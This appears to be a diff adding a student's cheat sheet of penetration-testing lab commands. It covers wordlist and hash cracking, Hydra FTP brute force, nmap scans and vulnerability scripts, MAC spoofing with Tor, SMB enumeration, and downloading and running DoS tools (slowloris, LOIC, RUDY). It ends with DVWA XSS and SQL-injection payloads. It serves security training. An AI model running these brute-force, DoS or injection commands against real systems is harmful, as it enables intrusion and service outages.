@@ -1,0 +1,137 @@
+# ========== Password Cracking (Ex No 1) ==========
+crunch 4 6 abc123 -o mywordlist.txt      # gen wordlist
+cat wordlist.txt                        # show wordlist
+hashid <hash>                           # detect hash
+echo <hash> > hash.txt                  # save hash to file
+john --format=raw-md5 --wordlist=wordlist.txt hash.txt   # crack hash
+john --show --format=raw-md5 hash.txt   # show cracked pw
+
+sudo apt-get update                     # update packages
+sudo apt install vsftpd                 # install vsftpd
+sudo systemctl start vsftpd             # start vsftpd
+sudo systemctl enable vsftpd            # enable on boot
+
+hydra -l <user> -P wordlist.txt <ip> ftp    # FTP brute force
+
+# ========== Sniffing (Ex No 7, Wireshark & Burp) ==========
+sudo apt install vsftpd                 # install ftp server
+sudo systemctl enable --now vsftpd      # enable/start ftp
+
+# In Kali Linux:
+wireshark                               # sniff packets
+ftp <target_ip>                         # ftp connect to target
+
+# Launch Metasploit
+msfconsole                              # start metasploit framework
+
+# Burp Suite (manual steps)
+# Start Burp, Intercept requests, analyze HTTP requests, use Intruder for brute force
+
+# ========== Nmap, Scanning & Enumeration (Ex No 3, 4) ==========
+nmap -sn -PE <subnet>                   # ICMP ping discovery
+nmap -sn -PP <subnet>                   # Timestamp ping discover
+nmap -sn -PM <subnet>                   # Netmask ping discovery
+nmap -sn -PS22,80,443 <subnet>          # TCP SYN ping discovery
+nmap -sn -PU53,161 <subnet>             # UDP ping discovery
+nmap -sn -PS80,443 -PU53,161 <subnet>   # Combined TCP/UDP discover
+nmap -n -sn <subnet>                    # skip rev DNS discovery
+
+nmap -sT <ip>                           # TCP connect scan
+nmap -sS <ip>                           # SYN/stealth scan
+nmap -sS -f <ip>                        # SYN with fragment
+nmap -sS -D RND5 <ip>                   # decoy scan
+nmap -b user:pass@relayftp@<ip>         # FTP bounce scan
+nmap -A <ip>                            # aggressive scan (OS, version)
+
+nmap -sV <ip>                           # service version scan
+nmap -O <ip>                            # OS detection
+nmap -p 21,22,80,443 <ip>               # scan selected ports
+
+# Vulnerability Nmap scans
+nmap -p 80 --script http-vuln-cve2017-5638 <ip>              # scan Struts
+nmap -p 80 --script http-dombased-xss <ip>                   # scan DOM-XSS
+nmap -p 80 --script http-sql-injection <ip>                  # scan SQLi
+nmap -script http-shellshock <ip>                            # scan shellshock
+nmap -p 139,445 --script smb-vuln-ms17-010 <ip>              # EternalBlue
+nmap -script smb-os-discovery <ip>                           # SMB OS info
+nmap -p 139,445 --script smb-enum-shares <ip>                # SMB shares
+nmap -p 139,445 --script smb-security-mode <ip>              # SMB security
+nmap -p 139,445 --script smb-vuln-cve-2017-7494 <ip>         # Samba RCE
+nmap -p 21 --script ftp-anon <ip>                            # FTP anonymous
+nmap -p 21 --script ftp-vsftpd-backdoor <ip>                 # FTP backdoor
+nmap -p 21 --script ftp-syst <ip>                            # FTP server info
+nmap -p 21 --script ftp-bounce <ip>                          # FTP bounce
+nmap -script ssl-enum-ciphers <ip>                           # SSL ciphers
+nmap -script mysql-empty-password <ip>                       # MySQL empty pwd
+nmap -p 53 --script dns-zone-transfer <ip>                   # DNS zone transfer
+nmap -p 23 --script telnet-encryption <ip>                   # Telnet enc check
+nmap -sV --script vulners <ip>                               # version CVEs
+nmap -p 8009 --script ajp-headers <ip>                       # Tomcat AJP
+
+# ========== Proxy Tools ==========
+ifconfig eth0                                # view MAC
+sudo ifconfig eth0 down                      # bring down
+sudo macchanger -r eth0                      # random MAC
+sudo ifconfig eth0 up                        # bring up
+macchanger -s eth0                           # show new MAC
+
+sudo apt install tor proxychains             # install tor & proxychains
+sudo service tor start                       # start tor
+sudo nano /etc/proxychains.conf              # edit proxychains conf
+proxychains nmap -sT <target>                # run nmap via tor
+proxychains curl http://example.com          # run curl via tor
+
+# ========== SMB/Enum/FTP ==========
+enum4linux -a <ip>                           # SMB enum
+enum4linux -u <user> -p <pwd> <ip>           # SMB enum auth
+rpcclient -U <ip>                            # connect rpcclient
+rpcclient enumdomusers                       # enum users
+ftp <ip>                                     # connect ftp
+ls                                           # ftp: list remote files
+
+# ========== DoS/DDoS (Ex No 8) ==========
+sudo nmap --script http-slowloris-check <ip>             # check slowloris vuln
+sudo nmap -Pn -n -p 80 --script http-slowloris ... <ip>  # launch with args
+
+wget https://packetstormsecurity.com/files/download/81735/slowloris.pl   # get slowloris perl
+chmod +x slowloris.pl                                 # make script exec
+perl slowloris.pl -dns <target_ip> -port 80 ...       # run perl slowloris
+
+git clone https://github.com/gkbrk/slowloris.git      # get python slowloris
+python3 slowloris.py <target_ip> -p 80 -s 1024        # run python slowloris
+
+sudo apt update                                      # update package
+sudo apt install mono-complete unzip                 # install mono/unzip
+wget https://github.com/shasradha/LOIC/archive/refs/heads/master.zip    # get LOIC
+unzip master.zip                                     # unzip LOIC files
+cd LOIC-main/
+unzip LOIC-1.0.8-binary.zip                          # unzip LOIC binary
+mono LOIC.exe                                        # run LOIC
+
+top                                                  # monitor resources
+netstat -an | grep 80 | wc -l                        # socket count
+
+sudo apt install slowhttptest                        # install slowhttptest
+slowhttptest -c 1024 -B -i 10 -r 100 -t POST -u http://<target>/login.php  # run RUDY attack
+watch -n 2 curl -I http://<target>                   # check if site up
+vmstat 1                                             # monitor stats
+
+# ========== Social Engineering, XSS, SQLi (Ex No 9) ==========
+ifconfig                                   # attacker IP
+cat /root/.set/reports/YYYY-MM-DD_HHMMSS.xml      # view SET report
+
+# in DVWA, test for XSS:
+<script>alert('KESHO XSS Successful!');</script>    # test payload
+# SQLi in DVWA:
+1 OR 1=1                                         # auth bypass
+1 UNION SELECT null, version()                   # get version
+1 UNION SELECT null, database()                  # get db name
+1 UNION SELECT null, user()                      # get db user
+
+# ========== Misc ==========
+sudo apt-get update                             # update system
+sudo apt install vsftpd                         # install FTP
+sudo systemctl start vsftpd                     # start FTP
+sudo systemctl enable vsftpd                    # enable on boot
+
+# Use Wireshark and Burp suite as described above for packet and web traffic analysis.
